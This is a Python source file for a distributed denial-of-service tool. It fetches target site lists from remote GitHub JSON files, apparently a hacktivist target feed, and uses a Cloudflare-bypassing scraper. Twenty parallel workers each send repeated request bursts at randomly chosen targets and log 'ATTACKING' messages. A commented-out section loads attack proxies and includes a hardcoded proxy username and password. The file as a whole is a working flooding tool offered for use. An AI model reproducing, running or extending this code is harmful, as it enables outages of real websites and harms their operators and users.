import asyncio
import json
import random
from sys import stderr

import requests
from aiocfscrape import CloudflareScraper
from aiohttp import ClientTimeout
from loguru import logger
from urllib3 import disable_warnings
from requests.auth import HTTPProxyAuth

# HOSTS = ['http://46.4.63.238/api.php']  # api for getting fucking sites
#SHIELD_HOSTS = ['https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json']
HOSTS = ['https://github.com/tsergiosoft/attacker/blob/master/flist.json?raw=true', 'https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json']
#HOSTS = ['https://github.com/tsergiosoft/attacker/blob/master/flist.json?raw=true']
PROX = ['https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json']

TIMEOUT = ClientTimeout(
    total=20,
    connect=10,
    sock_read=10,
    sock_connect=10,
)
REQUESTS_PER_SITE = 50
PARALLEL_COUNT = 20
SHOW_REQUEST_EXCEPTIONS = False
FORCE_HTTPS = True


def main():
    loop = asyncio.get_event_loop()
    union = asyncio.gather(*[
        start_one()
        for _ in range(PARALLEL_COUNT)
    ])
    loop.run_until_complete(union)


async def start_one():
    while True:
        try:
            '''
            phost = random.choice(PROX)
            pcontent = requests.get(phost).content
            pdata = json.loads(pcontent)
            plength = len(pdata)
            pind = random.randint(0, plength-1)
            proxies = pdata[pind]['ip']
            auth = pdata[pind]['auth']
            # auth = HTTPProxyAuth("Selvburykh", "Q7o3OqQ")
            '''
            host = random.choice(HOSTS)
            content = requests.get(host).content
            # , headers={'Cache-Control': 'no-cache'}
            data = json.loads(content)
            print(data)
            length = len(data)
            ind = random.randint(0, length-1)
            url = data[ind]['page']

            async with CloudflareScraper(timeout=TIMEOUT, trust_env=True) as session:
                # success = await attempt(session, url, proxies)
                success = await attempt(session, url)

        except Exception as e:
            logger.warning(f'Exception, retrying, exception={e}')


def _load_proxies(filename: str) -> list:
    with open(filename, 'r') as file:
        return file.read().splitlines()


def _fix_url(url: str, force_https: bool = False) -> str:
    if not url.startswith('http'):
        url = 'http://' + url
    if force_https:
        url = url.replace('http://', 'https://')
    return url


async def attempt(session: CloudflareScraper, url: str, proxy: str = None) -> bool:
    logger.info(f'\t\tTrying to attack {url} with proxy {proxy}')
    status_code = await request(session, url, proxy)
    if 200 <= status_code < 300:
        logger.info(f'START ATTACKING {url} USING PROXY {proxy}')
        for i in range(REQUESTS_PER_SITE):
            await request(session, url, proxy)
        logger.info(f'ATTACKING {url} IS DONE')
        return True
    return False


async def request(session: CloudflareScraper, url: str, proxy: str = None) -> int:
    try:
        async with session.get(url, proxy=proxy, verify_ssl=False) as response:
            return response.status
    except Exception as e:
        if SHOW_REQUEST_EXCEPTIONS:
            logger.warning(f'Exception on request, exception={e}, url={url}, proxy={proxy}')
        return -1


if __name__ == '__main__':
    logger.remove()
    logger.add(
        stderr,
        format='<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>'
    )
    disable_warnings()
    main()
